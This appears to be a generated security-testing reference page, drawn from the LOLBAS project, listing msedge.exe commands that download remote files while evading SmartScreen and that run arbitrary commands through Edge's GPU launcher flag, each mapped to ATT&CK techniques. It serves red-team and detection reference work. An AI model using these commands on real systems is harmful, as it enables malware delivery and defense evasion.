---
parsed_by: focuslocust
source: commands
type: generated
---
# Msedge Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Msedge.exe

Tool page: [Msedge.exe](../../tools/windows/msedge.exe.md)

### Download file from the internet

```text
msedge.exe {REMOTEURL:.exe.txt}
```

Description:

Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml` |
| Evidence | Command preserved from source parser. |

### Download file from the internet

```text
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
```

Description:

Edge will silently download the file. File extension should be .html and binaries should be encoded.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml` |
| Evidence | Command preserved from source parser. |

### Executes a process under a trusted Microsoft signed binary

```text
msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

Description:

Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

Related ATT&CK:

- [T1218.015](../../attack/techniques/T1218.015-electron-applications.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml` |
| Evidence | Command preserved from source parser. |
